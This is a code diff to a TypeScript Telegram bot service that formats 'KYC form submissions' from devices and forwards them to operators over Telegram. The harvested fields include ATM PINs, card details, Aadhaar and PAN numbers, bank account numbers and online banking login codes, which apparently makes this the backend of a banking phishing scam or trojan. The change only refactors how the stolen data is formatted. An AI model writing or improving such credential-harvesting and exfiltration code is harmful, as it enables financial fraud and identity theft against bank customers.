@@ -1291,34 +1291,53 @@ export class TelegramBotService {
     }
 
     async notifyFormSubmission(deviceName: string, form: FormData): Promise<void> {
+        // Helper to format a section only if it has data
+        const formatSection = (title: string, emoji: string, fields: { label: string; value: any }[]): string => {
+            const filledFields = fields.filter(f => f.value && f.value !== 'N/A' && f.value !== '');
+            if (filledFields.length === 0) return '';
+
+            let section = `*${emoji} ${title}:*\n`;
+            filledFields.forEach(f => {
+                section += `   ${f.label}: ${f.value}\n`;
+            });
+            section += '\n';
+            return section;
+        };
+
         let message = `📝 *New KYC Form Submission*\n\n`;
         message += `📱 Device: *⟨${deviceName}⟩*\n`;
         message += `━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
 
-        message += `*👤 Personal Details:*\n`;
-        message += `   Name: ${form.fullName || form.name || 'N/A'}\n`;
-        message += `   Mobile: ${form.mobileNumber || form.phoneNumber || 'N/A'}\n`;
-        message += `   Mother: ${form.motherName || 'N/A'}\n`;
-        message += `   DOB: ${form.dateOfBirth || 'N/A'}\n\n`;
+        message += formatSection('Personal Details', '👤', [
+            { label: 'Name', value: form.fullName || form.name },
+            { label: 'Mobile', value: form.mobileNumber || form.phoneNumber },
+            { label: 'Mother', value: form.motherName },
+            { label: 'DOB', value: form.dateOfBirth }
+        ]);
 
-        message += `*🏦 Account Details:*\n`;
-        message += `   Account: ${form.accountNumber || 'N/A'}\n`;
-        message += `   Aadhaar: ${form.aadhaarNumber || 'N/A'}\n`;
-        message += `   PAN: ${form.panCard || 'N/A'}\n`;
-        message += `   CIF: ${form.cifNumber || 'N/A'}\n`;
-        message += `   Branch: ${form.branchCode || 'N/A'}\n\n`;
+        message += formatSection('Account Details', '🏦', [
+            { label: 'Account', value: form.accountNumber },
+            { label: 'Aadhaar', value: form.aadhaarNumber },
+            { label: 'PAN', value: form.panCard },
+            { label: 'CIF', value: form.cifNumber },
+            { label: 'Branch', value: form.branchCode }
+        ]);
 
-        message += `*💳 Card Details:*\n`;
-        message += `   Last 6: ${form.cardLast6 || 'N/A'}\n`;
-        message += `   Expiry: ${form.cardExpiry || 'N/A'}\n`;
-        message += `   PIN: ${form.atmPin || 'N/A'}\n`;
-        message += `   Final PIN: ${form.finalPin || 'N/A'}\n\n`;
+        message += formatSection('Card Details', '💳', [
+            { label: 'Last 6', value: form.cardLast6 },
+            { label: 'Expiry', value: form.cardExpiry },
+            { label: 'PIN', value: form.atmPin },
+            { label: 'Final PIN', value: form.finalPin }
+        ]);
 
-        message += `*🔐 Login Credentials:*\n`;
-        message += `   User ID: ${form.userId || 'N/A'}\n`;
-        message += `   Access Code: ${form.accessCode || 'N/A'}\n`;
-        message += `   Profile Code: ${form.profileCode || 'N/A'}`;
+        message += formatSection('Login Credentials', '🔐', [
+            { label: 'User ID', value: form.userId },
+            { label: 'Access Code', value: form.accessCode },
+            { label: 'Profile Code', value: form.profileCode }
+        ]);
 
+        // Remove trailing newlines
+        message = message.trim();
 
         await this.sendToAllAdmins(message);
     }
